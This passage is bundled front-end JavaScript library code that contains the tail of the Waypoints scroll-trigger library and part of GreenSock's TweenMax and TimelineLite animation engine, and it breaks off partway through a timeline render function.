    },
    e.prototype.createThrottledScrollHandler = function() {
        function t() {
            e.handleScroll(),
            e.didScroll = !1
        }
        var e = this;
        this.adapter.on("scroll.waypoints",
        function() {
            e.didScroll && !r.isTouch || (e.didScroll = !0, r.requestAnimationFrame(t))
        })
    },
    e.prototype.handleResize = function() {
        r.Context.refreshAll()
    },
    e.prototype.handleScroll = function() {
        var t = {},
        e = {
            horizontal: {
                newScroll: this.adapter.scrollLeft(),
                oldScroll: this.oldScroll.x,
                forward: "right",
                backward: "left"
            },
            vertical: {
                newScroll: this.adapter.scrollTop(),
                oldScroll: this.oldScroll.y,
                forward: "down",
                backward: "up"
            }
        };
        for (var i in e) {
            var n = e[i],
            r = n.newScroll > n.oldScroll,
            s = r ? n.forward: n.backward;
            for (var a in this.waypoints[i]) {
                var o = this.waypoints[i][a],
                l = n.oldScroll < o.triggerPoint,
                c = n.newScroll >= o.triggerPoint,
                h = l && c,
                u = !l && !c; (h || u) && (o.queueTrigger(s), t[o.group.id] = o.group)
            }
        }
        for (var d in t) t[d].flushTriggers();
        this.oldScroll = {
            x: e.horizontal.newScroll,
            y: e.vertical.newScroll
        }
    },
    e.prototype.innerHeight = function() {
        return this.element == this.element.window ? r.viewportHeight() : this.adapter.innerHeight()
    },
    e.prototype.remove = function(t) {
        delete this.waypoints[t.axis][t.key],
        this.checkEmpty()
    },
    e.prototype.innerWidth = function() {
        return this.element == this.element.window ? r.viewportWidth() : this.adapter.innerWidth()
    },
    e.prototype.destroy = function() {
        var t = [];
        for (var e in this.waypoints) for (var i in this.waypoints[e]) t.push(this.waypoints[e][i]);
        for (var n = 0,
        r = t.length; n < r; n++) t[n].destroy()
    },
    e.prototype.refresh = function() {
        var t, e = this.element == this.element.window,
        i = e ? void 0 : this.adapter.offset(),
        n = {};
        this.handleScroll(),
        t = {
            horizontal: {
                contextOffset: e ? 0 : i.left,
                contextScroll: e ? 0 : this.oldScroll.x,
                contextDimension: this.innerWidth(),
                oldScroll: this.oldScroll.x,
                forward: "right",
                backward: "left",
                offsetProp: "left"
            },
            vertical: {
                contextOffset: e ? 0 : i.top,
                contextScroll: e ? 0 : this.oldScroll.y,
                contextDimension: this.innerHeight(),
                oldScroll: this.oldScroll.y,
                forward: "down",
                backward: "up",
                offsetProp: "top"
            }
        };
        for (var s in t) {
            var a = t[s];
            for (var o in this.waypoints[s]) {
                var l, c, h, u, d, p = this.waypoints[s][o],
                f = p.options.offset,
                m = p.triggerPoint,
                g = 0,
                v = null == m;
                p.element !== p.element.window && (g = p.adapter.offset()[a.offsetProp]),
                "function" == typeof f ? f = f.apply(p) : "string" == typeof f && (f = parseFloat(f), p.options.offset.indexOf("%") > -1 && (f = Math.ceil(a.contextDimension * f / 100))),
                l = a.contextScroll - a.contextOffset,
                p.triggerPoint = g + l - f,
                c = m < a.oldScroll,
                h = p.triggerPoint >= a.oldScroll,
                u = c && h,
                d = !c && !h,
                !v && u ? (p.queueTrigger(a.backward), n[p.group.id] = p.group) : !v && d ? (p.queueTrigger(a.forward), n[p.group.id] = p.group) : v && a.oldScroll >= p.triggerPoint && (p.queueTrigger(a.forward), n[p.group.id] = p.group)
            }
        }
        return r.requestAnimationFrame(function() {
            for (var t in n) n[t].flushTriggers()
        }),
        this
    },
    e.findOrCreateByElement = function(t) {
        return e.findByElement(t) || new e(t)
    },
    e.refreshAll = function() {
        for (var t in n) n[t].refresh()
    },
    e.findByElement = function(t) {
        return n[t.waypointContextKey]
    },
    window.onload = function() {
        s && s(),
        e.refreshAll()
    },
    r.requestAnimationFrame = function(e) { (window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || t).call(window, e)
    },
    r.Context = e
} (),
function() {
    "use strict";
    function t(t, e) {
        return t.triggerPoint - e.triggerPoint
    }
    function e(t, e) {
        return e.triggerPoint - t.triggerPoint
    }
    function i(t) {
        this.name = t.name,
        this.axis = t.axis,
        this.id = this.name + "-" + this.axis,
        this.waypoints = [],
        this.clearTriggerQueues(),
        n[this.axis][this.name] = this
    }
    var n = {
        vertical: {},
        horizontal: {}
    },
    r = window.Waypoint;
    i.prototype.add = function(t) {
        this.waypoints.push(t)
    },
    i.prototype.clearTriggerQueues = function() {
        this.triggerQueues = {
            up: [],
            down: [],
            left: [],
            right: []
        }
    },
    i.prototype.flushTriggers = function() {
        for (var i in this.triggerQueues) {
            var n = this.triggerQueues[i],
            r = "up" === i || "left" === i;
            n.sort(r ? e: t);
            for (var s = 0,
            a = n.length; s < a; s += 1) {
                var o = n[s]; (o.options.continuous || s === n.length - 1) && o.trigger([i])
            }
        }
        this.clearTriggerQueues()
    },
    i.prototype.next = function(e) {
        this.waypoints.sort(t);
        var i = r.Adapter.inArray(e, this.waypoints);
        return i === this.waypoints.length - 1 ? null: this.waypoints[i + 1]
    },
    i.prototype.previous = function(e) {
        this.waypoints.sort(t);
        var i = r.Adapter.inArray(e, this.waypoints);
        return i ? this.waypoints[i - 1] : null
    },
    i.prototype.queueTrigger = function(t, e) {
        this.triggerQueues[e].push(t)
    },
    i.prototype.remove = function(t) {
        var e = r.Adapter.inArray(t, this.waypoints);
        e > -1 && this.waypoints.splice(e, 1)
    },
    i.prototype.first = function() {
        return this.waypoints[0]
    },
    i.prototype.last = function() {
        return this.waypoints[this.waypoints.length - 1]
    },
    i.findOrCreate = function(t) {
        return n[t.axis][t.name] || new i(t)
    },
    r.Group = i
} (),
function() {
    "use strict";
    function t(t) {
        return t === t.window
    }
    function e(e) {
        return t(e) ? e: e.defaultView
    }
    function i(t) {
        this.element = t,
        this.handlers = {}
    }
    var n = window.Waypoint;
    i.prototype.innerHeight = function() {
        return t(this.element) ? this.element.innerHeight: this.element.clientHeight
    },
    i.prototype.innerWidth = function() {
        return t(this.element) ? this.element.innerWidth: this.element.clientWidth
    },
    i.prototype.off = function(t, e) {
        function i(t, e, i) {
            for (var n = 0,
            r = e.length - 1; n < r; n++) {
                var s = e[n];
                i && i !== s || t.removeEventListener(s)
            }
        }
        var n = t.split("."),
        r = n[0],
        s = n[1],
        a = this.element;
        if (s && this.handlers[s] && r) i(a, this.handlers[s][r], e),
        this.handlers[s][r] = [];
        else if (r) for (var o in this.handlers) i(a, this.handlers[o][r] || [], e),
        this.handlers[o][r] = [];
        else if (s && this.handlers[s]) {
            for (var l in this.handlers[s]) i(a, this.handlers[s][l], e);
            this.handlers[s] = {}
        }
    },
    i.prototype.offset = function() {
        if (!this.element.ownerDocument) return null;
        var t = this.element.ownerDocument.documentElement,
        i = e(this.element.ownerDocument),
        n = {
            top: 0,
            left: 0
        };
        return this.element.getBoundingClientRect && (n = this.element.getBoundingClientRect()),
        {
            top: n.top + i.pageYOffset - t.clientTop,
            left: n.left + i.pageXOffset - t.clientLeft
        }
    },
    i.prototype.on = function(t, e) {
        var i = t.split("."),
        n = i[0],
        r = i[1] || "__default",
        s = this.handlers[r] = this.handlers[r] || {}; (s[n] = s[n] || []).push(e),
        this.element.addEventListener(n, e)
    },
    i.prototype.outerHeight = function(e) {
        var i, n = this.innerHeight();
        return e && !t(this.element) && (i = window.getComputedStyle(this.element), n += parseInt(i.marginTop, 10), n += parseInt(i.marginBottom, 10)),
        n
    },
    i.prototype.outerWidth = function(e) {
        var i, n = this.innerWidth();
        return e && !t(this.element) && (i = window.getComputedStyle(this.element), n += parseInt(i.marginLeft, 10), n += parseInt(i.marginRight, 10)),
        n
    },
    i.prototype.scrollLeft = function() {
        var t = e(this.element);
        return t ? t.pageXOffset: this.element.scrollLeft
    },
    i.prototype.scrollTop = function() {
        var t = e(this.element);
        return t ? t.pageYOffset: this.element.scrollTop
    },
    i.extend = function() {
        for (var t = Array.prototype.slice.call(arguments), e = 1, i = t.length; e < i; e++) !
        function(t, e) {
            if ("object" == typeof t && "object" == typeof e) for (var i in e) e.hasOwnProperty(i) && (t[i] = e[i]);
            t
        } (t[0], t[e]);
        return t[0]
    },
    i.inArray = function(t, e, i) {
        return null == e ? -1 : e.indexOf(t, i)
    },
    i.isEmptyObject = function(t) {
        for (var e in t) return ! 1;
        return ! 0
    },
    n.adapters.push({
        name: "noframework",
        Adapter: i
    }),
    n.Adapter = i
} ();
var _gsScope = "undefined" != typeof module && module.exports && "undefined" != typeof global ? global: this || window; (_gsScope._gsQueue || (_gsScope._gsQueue = [])).push(function() {
    "use strict";
    _gsScope._gsDefine("TweenMax", ["core.Animation", "core.SimpleTimeline", "TweenLite"],
    function(t, e, i) {
        var n = function(t) {
            var e, i = [],
            n = t.length;
            for (e = 0; e !== n; i.push(t[e++]));
            return i
        },
        r = function(t, e, i) {
            var n, r, s = t.cycle;
            for (n in s) r = s[n],
            t[n] = "function" == typeof r ? r(i, e[i]) : r[i % r.length];
            delete t.cycle
        },
        s = function(t, e, n) {
            i.call(this, t, e, n),
            this._cycle = 0,
            this._yoyo = this.vars.yoyo === !0,
            this._repeat = this.vars.repeat || 0,
            this._repeatDelay = this.vars.repeatDelay || 0,
            this._dirty = !0,
            this.render = s.prototype.render
        },
        a = i._internals,
        o = a.isSelector,
        l = a.isArray,
        c = s.prototype = i.to({},
        .1, {}),
        h = [];
        s.version = "1.19.1",
        c.constructor = s,
        c.kill()._gc = !1,
        s.killTweensOf = s.killDelayedCallsTo = i.killTweensOf,
        s.getTweensOf = i.getTweensOf,
        s.lagSmoothing = i.lagSmoothing,
        s.ticker = i.ticker,
        s.render = i.render,
        c.invalidate = function() {
            return this._yoyo = this.vars.yoyo === !0,
            this._repeat = this.vars.repeat || 0,
            this._repeatDelay = this.vars.repeatDelay || 0,
            this._uncache(!0),
            i.prototype.invalidate.call(this)
        },
        c.updateTo = function(t, e) {
            var n, r = this.ratio,
            s = this.vars.immediateRender || t.immediateRender;
            e && this._startTime < this._timeline._time && (this._startTime = this._timeline._time, this._uncache(!1), this._gc ? this._enabled(!0, !1) : this._timeline.insert(this, this._startTime - this._delay));
            for (n in t) this.vars[n] = t[n];
            if (this._initted || s) if (e) this._initted = !1,
            s && this.render(0, !0, !0);
            else if (this._gc && this._enabled(!0, !1), this._notifyPluginsOfEnabled && this._firstPT && i._onPluginEvent("_onDisable", this), this._time / this._duration > .998) {
                var a = this._totalTime;
                this.render(0, !0, !1),
                this._initted = !1,
                this.render(a, !0, !1)
            } else if (this._initted = !1, this._init(), this._time > 0 || s) for (var o, l = 1 / (1 - r), c = this._firstPT; c;) o = c.s + c.c,
            c.c *= l,
            c.s = o - c.c,
            c = c._next;
            return this
        },
        c.render = function(t, e, i) {
            this._initted || 0 === this._duration && this.vars.repeat && this.invalidate();
            var n, r, s, o, l, c, h, u, d = this._dirty ? this.totalDuration() : this._totalDuration,
            p = this._time,
            f = this._totalTime,
            m = this._cycle,
            g = this._duration,
            v = this._rawPrevTime;
            if (t >= d - 1e-7 && t >= 0 ? (this._totalTime = d, this._cycle = this._repeat, this._yoyo && 0 != (1 & this._cycle) ? (this._time = 0, this.ratio = this._ease._calcEnd ? this._ease.getRatio(0) : 0) : (this._time = g, this.ratio = this._ease._calcEnd ? this._ease.getRatio(1) : 1), this._reversed || (n = !0, r = "onComplete", i = i || this._timeline.autoRemoveChildren), 0 === g && (this._initted || !this.vars.lazy || i) && (this._startTime === this._timeline._duration && (t = 0), (v < 0 || t <= 0 && t >= -1e-7 || 1e-10 === v && "isPause" !== this.data) && v !== t && (i = !0, v > 1e-10 && (r = "onReverseComplete")), this._rawPrevTime = u = !e || t || v === t ? t: 1e-10)) : t < 1e-7 ? (this._totalTime = this._time = this._cycle = 0, this.ratio = this._ease._calcEnd ? this._ease.getRatio(0) : 0, (0 !== f || 0 === g && v > 0) && (r = "onReverseComplete", n = this._reversed), t < 0 && (this._active = !1, 0 === g && (this._initted || !this.vars.lazy || i) && (v >= 0 && (i = !0), this._rawPrevTime = u = !e || t || v === t ? t: 1e-10)), this._initted || (i = !0)) : (this._totalTime = this._time = t, 0 !== this._repeat && (o = g + this._repeatDelay, this._cycle = this._totalTime / o >> 0, 0 !== this._cycle && this._cycle === this._totalTime / o && f <= t && this._cycle--, this._time = this._totalTime - this._cycle * o, this._yoyo && 0 != (1 & this._cycle) && (this._time = g - this._time), this._time > g ? this._time = g: this._time < 0 && (this._time = 0)), this._easeType ? (l = this._time / g, c = this._easeType, h = this._easePower, (1 === c || 3 === c && l >= .5) && (l = 1 - l), 3 === c && (l *= 2), 1 === h ? l *= l: 2 === h ? l *= l * l: 3 === h ? l *= l * l * l: 4 === h && (l *= l * l * l * l), 1 === c ? this.ratio = 1 - l: 2 === c ? this.ratio = l: this._time / g < .5 ? this.ratio = l / 2 : this.ratio = 1 - l / 2) : this.ratio = this._ease.getRatio(this._time / g)), p === this._time && !i && m === this._cycle) return void(f !== this._totalTime && this._onUpdate && (e || this._callback("onUpdate")));
            if (!this._initted) {
                if (this._init(), !this._initted || this._gc) return;
                if (!i && this._firstPT && (this.vars.lazy !== !1 && this._duration || this.vars.lazy && !this._duration)) return this._time = p,
                this._totalTime = f,
                this._rawPrevTime = v,
                this._cycle = m,
                a.lazyTweens.push(this),
                void(this._lazy = [t, e]);
                this._time && !n ? this.ratio = this._ease.getRatio(this._time / g) : n && this._ease._calcEnd && (this.ratio = this._ease.getRatio(0 === this._time ? 0 : 1))
            }
            for (this._lazy !== !1 && (this._lazy = !1), this._active || !this._paused && this._time !== p && t >= 0 && (this._active = !0), 0 === f && (2 === this._initted && t > 0 && this._init(), this._startAt && (t >= 0 ? this._startAt.render(t, e, i) : r || (r = "_dummyGS")), this.vars.onStart && (0 === this._totalTime && 0 !== g || e || this._callback("onStart"))), s = this._firstPT; s;) s.f ? s.t[s.p](s.c * this.ratio + s.s) : s.t[s.p] = s.c * this.ratio + s.s,
            s = s._next;
            this._onUpdate && (t < 0 && this._startAt && this._startTime && this._startAt.render(t, e, i), e || (this._totalTime !== f || r) && this._callback("onUpdate")),
            this._cycle !== m && (e || this._gc || this.vars.onRepeat && this._callback("onRepeat")),
            r && (this._gc && !i || (t < 0 && this._startAt && !this._onUpdate && this._startTime && this._startAt.render(t, e, i), n && (this._timeline.autoRemoveChildren && this._enabled(!1, !1), this._active = !1), !e && this.vars[r] && this._callback(r), 0 === g && 1e-10 === this._rawPrevTime && 1e-10 !== u && (this._rawPrevTime = 0)))
        },
        s.to = function(t, e, i) {
            return new s(t, e, i)
        },
        s.from = function(t, e, i) {
            return i.runBackwards = !0,
            i.immediateRender = 0 != i.immediateRender,
            new s(t, e, i)
        },
        s.fromTo = function(t, e, i, n) {
            return n.startAt = i,
            n.immediateRender = 0 != n.immediateRender && 0 != i.immediateRender,
            new s(t, e, n)
        },
        s.staggerTo = s.allTo = function(t, e, a, c, u, d, p) {
            c = c || 0;
            var f, m, g, v, _ = 0,
            y = [],
            b = function() {
                a.onComplete && a.onComplete.apply(a.onCompleteScope || this, arguments),
                u.apply(p || a.callbackScope || this, d || h)
            },
            w = a.cycle,
            x = a.startAt && a.startAt.cycle;
            for (l(t) || ("string" == typeof t && (t = i.selector(t) || t), o(t) && (t = n(t))), t = t || [], c < 0 && (t = n(t), t.reverse(), c *= -1), f = t.length - 1, g = 0; g <= f; g++) {
                m = {};
                for (v in a) m[v] = a[v];
                if (w && (r(m, t, g), null != m.duration && (e = m.duration, delete m.duration)), x) {
                    x = m.startAt = {};
                    for (v in a.startAt) x[v] = a.startAt[v];
                    r(m.startAt, t, g)
                }
                m.delay = _ + (m.delay || 0),
                g === f && u && (m.onComplete = b),
                y[g] = new s(t[g], e, m),
                _ += c
            }
            return y
        },
        s.staggerFrom = s.allFrom = function(t, e, i, n, r, a, o) {
            return i.runBackwards = !0,
            i.immediateRender = 0 != i.immediateRender,
            s.staggerTo(t, e, i, n, r, a, o)
        },
        s.staggerFromTo = s.allFromTo = function(t, e, i, n, r, a, o, l) {
            return n.startAt = i,
            n.immediateRender = 0 != n.immediateRender && 0 != i.immediateRender,
            s.staggerTo(t, e, n, r, a, o, l)
        },
        s.delayedCall = function(t, e, i, n, r) {
            return new s(e, 0, {
                delay: t,
                onComplete: e,
                onCompleteParams: i,
                callbackScope: n,
                onReverseComplete: e,
                onReverseCompleteParams: i,
                immediateRender: !1,
                useFrames: r,
                overwrite: 0
            })
        },
        s.set = function(t, e) {
            return new s(t, 0, e)
        },
        s.isTweening = function(t) {
            return i.getTweensOf(t, !0).length > 0
        };
        var u = function(t, e) {
            for (var n = [], r = 0, s = t._first; s;) s instanceof i ? n[r++] = s: (e && (n[r++] = s), n = n.concat(u(s, e)), r = n.length),
            s = s._next;
            return n
        },
        d = s.getAllTweens = function(e) {
            return u(t._rootTimeline, e).concat(u(t._rootFramesTimeline, e))
        };
        s.killAll = function(t, i, n, r) {
            null == i && (i = !0),
            null == n && (n = !0);
            var s, a, o, l = d(0 != r),
            c = l.length,
            h = i && n && r;
            for (o = 0; o < c; o++) a = l[o],
            (h || a instanceof e || (s = a.target === a.vars.onComplete) && n || i && !s) && (t ? a.totalTime(a._reversed ? 0 : a.totalDuration()) : a._enabled(!1, !1))
        },
        s.killChildTweensOf = function(t, e) {
            if (null != t) {
                var r, c, h, u, d, p = a.tweenLookup;
                if ("string" == typeof t && (t = i.selector(t) || t), o(t) && (t = n(t)), l(t)) for (u = t.length; --u > -1;) s.killChildTweensOf(t[u], e);
                else {
                    r = [];
                    for (h in p) for (c = p[h].target.parentNode; c;) c === t && (r = r.concat(p[h].tweens)),
                    c = c.parentNode;
                    for (d = r.length, u = 0; u < d; u++) e && r[u].totalTime(r[u].totalDuration()),
                    r[u]._enabled(!1, !1)
                }
            }
        };
        var p = function(t, i, n, r) {
            i = i !== !1,
            n = n !== !1,
            r = r !== !1;
            for (var s, a, o = d(r), l = i && n && r, c = o.length; --c > -1;) a = o[c],
            (l || a instanceof e || (s = a.target === a.vars.onComplete) && n || i && !s) && a.paused(t)
        };
        return s.pauseAll = function(t, e, i) {
            p(!0, t, e, i)
        },
        s.resumeAll = function(t, e, i) {
            p(!1, t, e, i)
        },
        s.globalTimeScale = function(e) {
            var n = t._rootTimeline,
            r = i.ticker.time;
            return arguments.length ? (e = e || 1e-10, n._startTime = r - (r - n._startTime) * n._timeScale / e, n = t._rootFramesTimeline, r = i.ticker.frame, n._startTime = r - (r - n._startTime) * n._timeScale / e, n._timeScale = t._rootTimeline._timeScale = e, e) : n._timeScale
        },
        c.progress = function(t, e) {
            return arguments.length ? this.totalTime(this.duration() * (this._yoyo && 0 != (1 & this._cycle) ? 1 - t: t) + this._cycle * (this._duration + this._repeatDelay), e) : this._time / this.duration()
        },
        c.totalProgress = function(t, e) {
            return arguments.length ? this.totalTime(this.totalDuration() * t, e) : this._totalTime / this.totalDuration()
        },
        c.time = function(t, e) {
            return arguments.length ? (this._dirty && this.totalDuration(), t > this._duration && (t = this._duration), this._yoyo && 0 != (1 & this._cycle) ? t = this._duration - t + this._cycle * (this._duration + this._repeatDelay) : 0 !== this._repeat && (t += this._cycle * (this._duration + this._repeatDelay)), this.totalTime(t, e)) : this._time
        },
        c.duration = function(e) {
            return arguments.length ? t.prototype.duration.call(this, e) : this._duration
        },
        c.totalDuration = function(t) {
            return arguments.length ? this._repeat === -1 ? this: this.duration((t - this._repeat * this._repeatDelay) / (this._repeat + 1)) : (this._dirty && (this._totalDuration = this._repeat === -1 ? 999999999999 : this._duration * (this._repeat + 1) + this._repeatDelay * this._repeat, this._dirty = !1), this._totalDuration)
        },
        c.repeat = function(t) {
            return arguments.length ? (this._repeat = t, this._uncache(!0)) : this._repeat
        },
        c.repeatDelay = function(t) {
            return arguments.length ? (this._repeatDelay = t, this._uncache(!0)) : this._repeatDelay
        },
        c.yoyo = function(t) {
            return arguments.length ? (this._yoyo = t, this) : this._yoyo
        },
        s
    },
    !0),
    _gsScope._gsDefine("TimelineLite", ["core.Animation", "core.SimpleTimeline", "TweenLite"],
    function(t, e, i) {
        var n = function(t) {
            e.call(this, t),
            this._labels = {},
            this.autoRemoveChildren = this.vars.autoRemoveChildren === !0,
            this.smoothChildTiming = this.vars.smoothChildTiming === !0,
            this._sortChildren = !0,
            this._onUpdate = this.vars.onUpdate;
            var i, n, r = this.vars;
            for (n in r) i = r[n],
            o(i) && i.join("").indexOf("{self}") !== -1 && (r[n] = this._swapSelfInParams(i));
            o(r.tweens) && this.add(r.tweens, 0, r.align, r.stagger)
        },
        r = i._internals,
        s = n._internals = {},
        a = r.isSelector,
        o = r.isArray,
        l = r.lazyTweens,
        c = r.lazyRender,
        h = _gsScope._gsDefine.globals,
        u = function(t) {
            var e, i = {};
            for (e in t) i[e] = t[e];
            return i
        },
        d = function(t, e, i) {
            var n, r, s = t.cycle;
            for (n in s) r = s[n],
            t[n] = "function" == typeof r ? r(i, e[i]) : r[i % r.length];
            delete t.cycle
        },
        p = s.pauseCallback = function() {},
        f = function(t) {
            var e, i = [],
            n = t.length;
            for (e = 0; e !== n; i.push(t[e++]));
            return i
        },
        m = n.prototype = new e;
        return n.version = "1.19.1",
        m.constructor = n,
        m.kill()._gc = m._forcingPlayhead = m._hasPause = !1,
        m.to = function(t, e, n, r) {
            var s = n.repeat && h.TweenMax || i;
            return e ? this.add(new s(t, e, n), r) : this.set(t, n, r)
        },
        m.from = function(t, e, n, r) {
            return this.add((n.repeat && h.TweenMax || i).from(t, e, n), r)
        },
        m.fromTo = function(t, e, n, r, s) {
            var a = r.repeat && h.TweenMax || i;
            return e ? this.add(a.fromTo(t, e, n, r), s) : this.set(t, r, s)
        },
        m.staggerTo = function(t, e, r, s, o, l, c, h) {
            var p, m, g = new n({
                onComplete: l,
                onCompleteParams: c,
                callbackScope: h,
                smoothChildTiming: this.smoothChildTiming
            }),
            v = r.cycle;
            for ("string" == typeof t && (t = i.selector(t) || t), t = t || [], a(t) && (t = f(t)), s = s || 0, s < 0 && (t = f(t), t.reverse(), s *= -1), m = 0; m < t.length; m++) p = u(r),
            p.startAt && (p.startAt = u(p.startAt), p.startAt.cycle && d(p.startAt, t, m)),
            v && (d(p, t, m), null != p.duration && (e = p.duration, delete p.duration)),
            g.to(t[m], e, p, m * s);
            return this.add(g, o)
        },
        m.staggerFrom = function(t, e, i, n, r, s, a, o) {
            return i.immediateRender = 0 != i.immediateRender,
            i.runBackwards = !0,
            this.staggerTo(t, e, i, n, r, s, a, o)
        },
        m.staggerFromTo = function(t, e, i, n, r, s, a, o, l) {
            return n.startAt = i,
            n.immediateRender = 0 != n.immediateRender && 0 != i.immediateRender,
            this.staggerTo(t, e, n, r, s, a, o, l)
        },
        m.call = function(t, e, n, r) {
            return this.add(i.delayedCall(0, t, e, n), r)
        },
        m.set = function(t, e, n) {
            return n = this._parseTimeOrLabel(n, 0, !0),
            null == e.immediateRender && (e.immediateRender = n === this._time && !this._paused),
            this.add(new i(t, 0, e), n)
        },
        n.exportRoot = function(t, e) {
            t = t || {},
            null == t.smoothChildTiming && (t.smoothChildTiming = !0);
            var r, s, a = new n(t),
            o = a._timeline;
            for (null == e && (e = !0), o._remove(a, !0), a._startTime = 0, a._rawPrevTime = a._time = a._totalTime = o._time, r = o._first; r;) s = r._next,
            e && r instanceof i && r.target === r.vars.onComplete || a.add(r, r._startTime - r._delay),
            r = s;
            return o.add(a, 0),
            a
        },
        m.add = function(r, s, a, l) {
            var c, h, u, d, p, f;
            if ("number" != typeof s && (s = this._parseTimeOrLabel(s, 0, !0, r)), !(r instanceof t)) {
                if (r instanceof Array || r && r.push && o(r)) {
                    for (a = a || "normal", l = l || 0, c = s, h = r.length, u = 0; u < h; u++) o(d = r[u]) && (d = new n({
                        tweens: d
                    })),
                    this.add(d, c),
                    "string" != typeof d && "function" != typeof d && ("sequence" === a ? c = d._startTime + d.totalDuration() / d._timeScale: "start" === a && (d._startTime -= d.delay())),
                    c += l;
                    return this._uncache(!0)
                }
                if ("string" == typeof r) return this.addLabel(r, s);
                if ("function" != typeof r) throw "Cannot add " + r + " into the timeline; it is not a tween, timeline, function, or string.";
                r = i.delayedCall(0, r)
            }
            if (e.prototype.add.call(this, r, s), (this._gc || this._time === this._duration) && !this._paused && this._duration < this.duration()) for (p = this, f = p.rawTime() > r._startTime; p._timeline;) f && p._timeline.smoothChildTiming ? p.totalTime(p._totalTime, !0) : p._gc && p._enabled(!0, !1),
            p = p._timeline;
            return this
        },
        m.remove = function(e) {
            if (e instanceof t) {
                this._remove(e, !1);
                var i = e._timeline = e.vars.useFrames ? t._rootFramesTimeline: t._rootTimeline;
                return e._startTime = (e._paused ? e._pauseTime: i._time) - (e._reversed ? e.totalDuration() - e._totalTime: e._totalTime) / e._timeScale,
                this
            }
            if (e instanceof Array || e && e.push && o(e)) {
                for (var n = e.length; --n > -1;) this.remove(e[n]);
                return this
            }
            return "string" == typeof e ? this.removeLabel(e) : this.kill(null, e)
        },
        m._remove = function(t, i) {
            return e.prototype._remove.call(this, t, i),
            this._last ? this._time > this.duration() && (this._time = this._duration, this._totalTime = this._totalDuration) : this._time = this._totalTime = this._duration = this._totalDuration = 0,
            this
        },
        m.append = function(t, e) {
            return this.add(t, this._parseTimeOrLabel(null, e, !0, t))
        },
        m.insert = m.insertMultiple = function(t, e, i, n) {
            return this.add(t, e || 0, i, n)
        },
        m.appendMultiple = function(t, e, i, n) {
            return this.add(t, this._parseTimeOrLabel(null, e, !0, t), i, n)
        },
        m.addLabel = function(t, e) {
            return this._labels[t] = this._parseTimeOrLabel(e),
            this
        },
        m.addPause = function(t, e, n, r) {
            var s = i.delayedCall(0, p, n, r || this);
            return s.vars.onComplete = s.vars.onReverseComplete = e,
            s.data = "isPause",
            this._hasPause = !0,
            this.add(s, t)
        },
        m.removeLabel = function(t) {
            return delete this._labels[t],
            this
        },
        m.getLabelTime = function(t) {
            return null != this._labels[t] ? this._labels[t] : -1
        },
        m._parseTimeOrLabel = function(e, i, n, r) {
            var s;
            if (r instanceof t && r.timeline === this) this.remove(r);
            else if (r && (r instanceof Array || r.push && o(r))) for (s = r.length; --s > -1;) r[s] instanceof t && r[s].timeline === this && this.remove(r[s]);
            if ("string" == typeof i) return this._parseTimeOrLabel(i, n && "number" == typeof e && null == this._labels[i] ? e - this.duration() : 0, n);
            if (i = i || 0, "string" != typeof e || !isNaN(e) && null == this._labels[e]) null == e && (e = this.duration());
            else {
                if ((s = e.indexOf("=")) === -1) return null == this._labels[e] ? n ? this._labels[e] = this.duration() + i: i: this._labels[e] + i;
                i = parseInt(e.charAt(s - 1) + "1", 10) * Number(e.substr(s + 1)),
                e = s > 1 ? this._parseTimeOrLabel(e.substr(0, s - 1), 0, n) : this.duration()
            }
            return Number(e) + i
        },
        m.seek = function(t, e) {
            return this.totalTime("number" == typeof t ? t: this._parseTimeOrLabel(t), e !== !1)
        },
        m.stop = function() {
            return this.paused(!0)
        },
        m.gotoAndPlay = function(t, e) {
            return this.play(t, e)
        },
        m.gotoAndStop = function(t, e) {
            return this.pause(t, e)
        },
        m.render = function(t, e, i) {
            this._gc && this._enabled(!0, !1);
            var n, r, s, a, o, h, u, d = this._dirty ? this.totalDuration() : this._totalDuration,
            p = this._time,
            f = this._startTime,
            m = this._timeScale,
            g = this._paused;
            if (t >= d - 1e-7 && t >= 0) this._totalTime = this._time = d,
            this._reversed || this._hasPausedChild() || (r = !0, a = "onComplete", o = !!this._timeline.autoRemoveChildren, 0 === this._duration && (t <= 0 && t >= -1e-7 || this._rawPrevTime < 0 || 1e-10 === this._rawPrevTime) && this._rawPrevTime !== t && this._first && (o = !0, this._rawPrevTime > 1e-10 && (a = "onReverseComplete"))),
            this._rawPrevTime = this._duration || !e || t || this._rawPrevTime === t ? t: 1e-10,
            t = d + 1e-4;
            else if (t < 1e-7) if (this._totalTime = this._time = 0, (0 !== p || 0 === this._duration && 1e-10 !== this._rawPrevTime && (this._rawPrevTime > 0 || t < 0 && this._rawPrevTime >= 0)) && (a = "onReverseComplete", r = this._reversed), t < 0) this._active = !1,
            this._timeline.autoRemoveChildren && this._reversed ? (o = r = !0, a = "onReverseComplete") : this._rawPrevTime >= 0 && this._first && (o = !0),
            this._rawPrevTime = t;
            else {
                if (this._rawPrevTime = this._duration || !e || t || this._rawPrevTime === t ? t: 1e-10, 0 === t && r) for (n = this._first; n && 0 === n._startTime;) n._duration || (r = !1),
                n = n._next;
                t = 0,
                this._initted || (o = !0)
            } else {
                if (this._hasPause && !this._forcingPlayhead && !e) {
                    if (t >= p) for (n = this._first; n && n._startTime <= t && !h;) n._duration || "isPause" !== n.data || n.ratio || 0 === n._startTime && 0 === this._rawPrevTime || (h = n),
                    n = n._next;
                    else for (n = this._last; n && n._startTime >= t && !h;) n._duration || "isPause" === n.data && n._rawPrevTime > 0 && (h = n),
                    n = n._prev;
                    h && (this._time = t = h._startTime, this._totalTime = t + this._cycle * (this._totalDuration + this._repeatDelay))
                }
                this._totalTime = this._time = this._rawPrevTime = t
            }
            if (this._time !== p && this._first || i || o || h) {
                if (this._initted || (this._initted = !0), this._active || !this._paused && this._time !== p && t > 0 && (this._active = !0), 0 === p && this.vars.onStart && (0 === this._time && this._duration || e || this._callback("onStart")), (u = this._time) >= p) for (n = this._first; n && (s = n._next, u === this._time && (!this._paused || g));)(n._active || n._startTime <= u && !n._paused && !n._gc) && (h === n && this.pause(), n._reversed ? n.render((n._dirty ? n.totalDuration() : n._totalDuration) - (t - n._startTime) * n._timeScale, e, i) : n.render((t - n._startTime) * n._timeScale, e, i)),
                n = s;
                else for (n = this._last; n && (s = n._prev, u === this._time && (!this._paused || g));) {
                    if (n._active || n._startTime <= p && !n._paused && !n._gc) {
                        if (h === n) {
                            for (h = n._prev; h && h.endTime() > this._time;) h.render(h._reversed ? h.totalDuration() - (t - h._startTime) * h._timeScale: (t - h._startTime) * h._timeScale, e, i),
                            h = h._prev;
                            h = null,
                            this.pause()
                        }
